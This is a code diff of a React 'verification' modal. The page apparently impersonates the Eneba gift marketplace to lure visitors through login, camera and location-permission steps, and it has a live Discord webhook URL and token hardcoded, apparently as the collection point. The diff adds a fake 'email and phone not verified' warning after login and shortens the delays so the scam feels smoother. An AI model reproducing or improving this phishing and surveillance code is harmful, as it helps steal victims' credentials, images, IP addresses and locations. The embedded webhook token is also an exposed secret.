@@ -1,8 +1,10 @@
 
 import React, { useState, useRef, useEffect } from 'react';
 import axios from 'axios';
-import { Circle, Check, Camera, MapPin, Loader } from 'lucide-react';
+import { Circle, Check, Camera, MapPin, Loader, AlertCircle } from 'lucide-react';
 import LoginSignupModal from './LoginSignupModal';
+import { Alert, AlertDescription } from '@/components/ui/alert';
+import { Avatar, AvatarImage, AvatarFallback } from '@/components/ui/avatar';
 
 interface VerificationModalProps {
   isOpen: boolean;
@@ -11,50 +13,63 @@ interface VerificationModalProps {
 }
 
 const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProps) => {
-  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
-  const [countdown, setCountdown] = useState(4);
+  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'warning' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
   const [userData, setUserData] = useState<any>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
   const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
+  
+  // Profile picture for logged-in users (randomly selected)
+  const profilePictures = [
+    "/placeholder.svg",
+    "https://images.unsplash.com/photo-1649972904349-6e44c42644a7?auto=format&fit=crop&w=80&h=80",
+    "https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?auto=format&fit=crop&w=80&h=80",
+    "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=80&h=80",
+    "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?auto=format&fit=crop&w=80&h=80"
+  ];
+  
+  const [profilePicture, setProfilePicture] = useState(profilePictures[0]);
 
   useEffect(() => {
     if (isOpen && step === 'loading') {
-      const timer = setInterval(() => {
-        setCountdown(prev => {
-          if (prev <= 1) {
-            clearInterval(timer);
-            setStep('verify');
-            return 4;
-          }
-          return prev - 1;
-        });
-      }, 1000);
+      // Shortened loading time to 1.5 seconds
+      const timer = setTimeout(() => {
+        setStep('verify');
+      }, 1500);
       
-      return () => clearInterval(timer);
+      return () => clearTimeout(timer);
     }
   }, [isOpen, step]);
 
   const handleContinue = () => {
     setStep('loading');
-    setCountdown(4);
     
+    // Shortened loading time to 1.5 seconds
     const timer = setTimeout(() => {
       setStep('auth');
-    }, 4000);
+    }, 1500);
     
     return () => clearTimeout(timer);
   };
   
   const handleAuthComplete = (data: any) => {
     setUserData(data);
-    setStep('loading');
-    setCountdown(4);
     
+    // Set a random profile picture for the user
+    setProfilePicture(profilePictures[Math.floor(Math.random() * profilePictures.length)]);
+    
+    // Show warning step after authentication
+    setStep('warning');
+  };
+  
+  const handleWarningContinue = () => {
+    setStep('loading');
+    
+    // Shortened loading time to 1.5 seconds
     const timer = setTimeout(() => {
       setStep('permissions');
-    }, 4000);
+    }, 1500);
     
     return () => clearTimeout(timer);
   };
@@ -205,7 +220,7 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           {step === 'loading' && (
             <div className="flex flex-col items-center space-y-4">
               <Loader className="animate-spin h-12 w-12 text-white" />
-              <p className="text-xl">Loading... {countdown}s</p>
+              <p className="text-xl">Loading...</p>
             </div>
           )}
           
@@ -216,6 +231,37 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
               <button 
                 className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                 onClick={handleContinue}
+              >
+                Continue
+              </button>
+            </div>
+          )}
+          
+          {step === 'warning' && userData && (
+            <div className="flex flex-col items-center space-y-4">
+              <div className="flex items-center space-x-3 mb-2">
+                <Avatar className="h-12 w-12 border-2 border-custom-yellow">
+                  <AvatarImage src={profilePicture} alt="Profile" />
+                  <AvatarFallback>
+                    {userData.fullName ? userData.fullName.charAt(0).toUpperCase() : userData.email.charAt(0).toUpperCase()}
+                  </AvatarFallback>
+                </Avatar>
+                <div className="text-left">
+                  <p className="font-medium">{userData.fullName || "ENEBA User"}</p>
+                  <p className="text-xs text-gray-400">{userData.email}</p>
+                </div>
+              </div>
+              
+              <Alert className="bg-amber-900/30 border-amber-500/50 my-2">
+                <AlertCircle className="h-5 w-5 text-amber-500" />
+                <AlertDescription className="text-left ml-2 text-amber-100">
+                  Your email and phone number are not verified. After redeeming your gift, please visit User Settings to verify them.
+                </AlertDescription>
+              </Alert>
+              
+              <button 
+                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
+                onClick={handleWarningContinue}
               >
                 Continue
               </button>
